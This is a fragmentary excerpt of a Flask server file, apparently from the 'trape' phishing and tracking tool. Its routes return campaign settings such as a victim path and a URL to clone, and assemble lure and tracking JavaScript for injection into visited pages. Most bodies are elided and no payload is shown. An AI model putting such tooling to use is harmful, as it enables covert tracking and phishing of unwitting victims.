...
# **
import os
from flask import render_template, request, json, redirect, send_from_directory
from flask_cors import cross_origin
import urllib
from core import app, db, trape
...
def index():
    return trape.injectCSS_Paths(render_template("/login.html")
                                 .replace('[LOGIN_SRC]', trape.JSFiles[2]['src'])
                                 .replace('[LIBS_SRC]', trape.JSFiles[1]['src']))
...
def login():
    ...
    if id == trape.stats_key:
        return json.dumps({'status': 'OK',
                           'path': trape.home_path,
                           'victim_path': trape.victim_path,
                           'url_to_clone': trape.url_to_clone,
                           'app_port': trape.app_port,
                           'date_start': trape.date_start,
                           'user_ip': trape.localIp,
                           'logout': trape.logout_path,
                           'rm_path': trape.remove_path})
    else:
...
def home_get_title():
    ...
    return json.dumps({'status': 'OK', 'title': html.decode('utf8')})
...
def inject():
    ...
    codeToInject = f_codeToInject.read().replace('[LIBS_SRC]', trape.JSFiles[1]['src']) \
        .replace('[BASE_SRC]', trape.JSFiles[0]['src']) \
        .replace('[LURE_SRC]', trape.JSFiles[3]['src']) \
        .replace('[CUSTOM_SRC]', trape.JSFiles[6]['src'])
...
def file_redirect(File):
    ...
    return send_from_directory(directory=os.getcwd(), filename=File)
